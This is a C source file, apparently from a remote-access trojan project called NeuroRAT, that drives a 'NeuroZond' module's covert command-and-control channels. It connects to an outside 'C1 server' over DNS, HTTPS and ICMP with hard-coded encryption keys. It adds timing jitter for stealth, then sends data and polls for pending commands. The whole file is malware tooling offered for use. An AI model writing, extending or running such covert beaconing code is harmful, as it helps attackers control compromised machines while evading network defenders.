/**
 * @file main.c
 * @brief Main module for demonstrating NeuroZond covert communication channels
 * @author NeuroRAT Team
 * @date 2023-05-11
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#endif

#include "covert_channel.h"

// Function prototypes
int init_network();
void cleanup_network();
int test_dns_channel(const char *server_address);
int test_https_channel(const char *server_address);
int test_icmp_channel(const char *server_address);
void print_usage(const char *prog_name);

int main(int argc, char *argv[]) {
    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }

    const char *server_address = argv[1];
    printf("[+] Starting NeuroZond covert channel tests\n");
    printf("[+] Using C1 server: %s\n", server_address);
    
    // Initialize network subsystem
    if (init_network() != 0) {
        fprintf(stderr, "[-] Failed to initialize network\n");
        return 1;
    }
    
    // Seed random number generator for jitter values
    srand(time(NULL));
    
    // Test all channels
    printf("\n[*] Testing DNS covert channel...\n");
    if (test_dns_channel(server_address) == 0) {
        printf("[+] DNS channel test successful\n");
    } else {
        printf("[-] DNS channel test failed\n");
    }
    
    printf("\n[*] Testing HTTPS covert channel...\n");
    if (test_https_channel(server_address) == 0) {
        printf("[+] HTTPS channel test successful\n");
    } else {
        printf("[-] HTTPS channel test failed\n");
    }
    
    printf("\n[*] Testing ICMP covert channel...\n");
    if (test_icmp_channel(server_address) == 0) {
        printf("[+] ICMP channel test successful\n");
    } else {
        printf("[-] ICMP channel test failed\n");
    }
    
    // Cleanup network subsystem
    cleanup_network();
    
    printf("\n[+] All covert channel tests completed\n");
    return 0;
}

int init_network() {
#ifdef _WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "[-] WSAStartup failed\n");
        return 1;
    }
#endif
    return 0;
}

void cleanup_network() {
#ifdef _WIN32
    WSACleanup();
#endif
}

int test_dns_channel(const char *server_address) {
    void *channel = NULL;
    CovertChannelConfig config;
    int result = -1;
    
    // Initialize configuration
    memset(&config, 0, sizeof(config));
    strncpy(config.server_address, server_address, sizeof(config.server_address) - 1);
    config.server_port = 53;  // DNS server port
    config.channel_type = CHANNEL_DNS;
    config.encryption = ENCRYPTION_XOR;
    config.encryption_key = (uint8_t*)"dnskey123";
    config.encryption_key_len = 9;
    
    printf("[+] Initializing DNS channel to %s:%d\n", config.server_address, config.server_port);
    
    // Initialize channel
    channel = covert_channel_init(&config);
    if (!channel) {
        fprintf(stderr, "[-] Failed to initialize DNS channel\n");
        return -1;
    }
    
    // Set jitter for stealth
    if (covert_channel_set_jitter(channel, 100, 500) != 0) {
        fprintf(stderr, "[-] Failed to set jitter\n");
        covert_channel_cleanup(channel);
        return -1;
    }
    
    // Connect to C1 server
    printf("[+] Connecting to C1 server using DNS channel\n");
    if (covert_channel_connect(channel) != 0) {
        fprintf(stderr, "[-] Failed to connect using DNS channel\n");
        covert_channel_cleanup(channel);
        return -1;
    }
    
    // Send test data
    const uint8_t test_data[] = "Hello from NeuroZond DNS channel";
    printf("[+] Sending test data: '%s'\n", test_data);
    
    if (covert_channel_send(channel, test_data, sizeof(test_data)) != 0) {
        fprintf(stderr, "[-] Failed to send data via DNS channel\n");
        covert_channel_cleanup(channel);
        return -1;
    }
    
    // Receive data
    uint8_t buffer[1024];
    size_t bytes_received = 0;
    
    printf("[+] Waiting for response data from C1 server...\n");
    if (covert_channel_receive(channel, buffer, sizeof(buffer), &bytes_received) == 0) {
        if (bytes_received > 0) {
            buffer[bytes_received] = '\0';  // Null-terminate for printing
            printf("[+] Received data (%zu bytes): '%s'\n", bytes_received, buffer);
        } else {
            printf("[+] No data received (normal if no pending commands)\n");
        }
        result = 0;
    } else {
        fprintf(stderr, "[-] Failed to receive data via DNS channel\n");
    }
    
    // Clean up
    printf("[+] Cleaning up DNS channel\n");
    covert_channel_cleanup(channel);
    
    return result;
}

int test_https_channel(const char *server_address) {
    void *channel = NULL;
    CovertChannelConfig config;
    int result = -1;
    
    // Initialize configuration
    memset(&config, 0, sizeof(config));
    strncpy(config.server_address, server_address, sizeof(config.server_address) - 1);
    config.server_port = 443;  // HTTPS server port
    config.channel_type = CHANNEL_HTTPS;
    config.encryption = ENCRYPTION_AES256;
    config.encryption_key = (uint8_t*)"aes256keyforsecurecommunication!";
    config.encryption_key_len = 32;  // AES-256 requires 32-byte key
    
    printf("[+] Initializing HTTPS channel to %s:%d\n", config.server_address, config.server_port);
    
    // Initialize channel
    channel = covert_channel_init(&config);
    if (!channel) {
        fprintf(stderr, "[-] Failed to initialize HTTPS channel\n");
        return -1;
    }
    
    // Set jitter for stealth
    if (covert_channel_set_jitter(channel, 1000, 3000) != 0) {
        fprintf(stderr, "[-] Failed to set jitter\n");
        covert_channel_cleanup(channel);
        return -1;
    }
    
    // Connect to C1 server
    printf("[+] Connecting to C1 server using HTTPS channel\n");
    if (covert_channel_connect(channel) != 0) {
        fprintf(stderr, "[-] Failed to connect using HTTPS channel\n");
        covert_channel_cleanup(channel);
        return -1;
    }
    
    // Send test data
    const uint8_t test_data[] = "Hello from NeuroZond HTTPS channel";
    printf("[+] Sending test data: '%s'\n", test_data);
    
    if (covert_channel_send(channel, test_data, sizeof(test_data)) != 0) {
        fprintf(stderr, "[-] Failed to send data via HTTPS channel\n");
        covert_channel_cleanup(channel);
        return -1;
    }
    
    // Receive data
    uint8_t buffer[1024];
    size_t bytes_received = 0;
    
    printf("[+] Waiting for response data from C1 server...\n");
    if (covert_channel_receive(channel, buffer, sizeof(buffer), &bytes_received) == 0) {
        if (bytes_received > 0) {
            buffer[bytes_received] = '\0';  // Null-terminate for printing
            printf("[+] Received data (%zu bytes): '%s'\n", bytes_received, buffer);
        } else {
            printf("[+] No data received (normal if no pending commands)\n");
        }
        result = 0;
    } else {
        fprintf(stderr, "[-] Failed to receive data via HTTPS channel\n");
    }
    
    // Clean up
    printf("[+] Cleaning up HTTPS channel\n");
    covert_channel_cleanup(channel);
    
    return result;
}

int test_icmp_channel(const char *server_address) {
    void *channel = NULL;
    CovertChannelConfig config;
    int result = -1;
    
    // Initialize configuration
    memset(&config, 0, sizeof(config));
    strncpy(config.server_address, server_address, sizeof(config.server_address) - 1);
    config.server_port = 0;  // Not used for ICMP
    config.channel_type = CHANNEL_ICMP;
    config.encryption = ENCRYPTION_CHACHA20;
    config.encryption_key = (uint8_t*)"chacha20secretkeyforencryption!!!";
    config.encryption_key_len = 32;
    
    printf("[+] Initializing ICMP channel to %s\n", config.server_address);
    
    // Initialize channel
    channel = covert_channel_init(&config);
    if (!channel) {
        fprintf(stderr, "[-] Failed to initialize ICMP channel\n");
        return -1;
    }
    
    // Set jitter for stealth
    if (covert_channel_set_jitter(channel, 500, 2000) != 0) {
        fprintf(stderr, "[-] Failed to set jitter\n");
        covert_channel_cleanup(channel);
        return -1;
    }
    
    // Connect to C1 server
    printf("[+] Connecting to C1 server using ICMP channel\n");
    if (covert_channel_connect(channel) != 0) {
        fprintf(stderr, "[-] Failed to connect using ICMP channel\n");
        covert_channel_cleanup(channel);
        return -1;
    }
    
    // Send test data
    const uint8_t test_data[] = "Hello from NeuroZond ICMP channel";
    printf("[+] Sending test data: '%s'\n", test_data);
    
    if (covert_channel_send(channel, test_data, sizeof(test_data)) != 0) {
        fprintf(stderr, "[-] Failed to send data via ICMP channel\n");
        covert_channel_cleanup(channel);
        return -1;
    }
    
    // Receive data
    uint8_t buffer[1024];
    size_t bytes_received = 0;
    
    printf("[+] Waiting for response data from C1 server...\n");
    if (covert_channel_receive(channel, buffer, sizeof(buffer), &bytes_received) == 0) {
        if (bytes_received > 0) {
            buffer[bytes_received] = '\0';  // Null-terminate for printing
            printf("[+] Received data (%zu bytes): '%s'\n", bytes_received, buffer);
        } else {
            printf("[+] No data received (normal if no pending commands)\n");
        }
        result = 0;
    } else {
        fprintf(stderr, "[-] Failed to receive data via ICMP channel\n");
    }
    
    // Clean up
    printf("[+] Cleaning up ICMP channel\n");
    covert_channel_cleanup(channel);
    
    return result;
}

void print_usage(const char *prog_name) {
    fprintf(stderr, "Usage: %s <c1_server_address>\n", prog_name);
    fprintf(stderr, "Example: %s c1.example.com\n", prog_name);
} 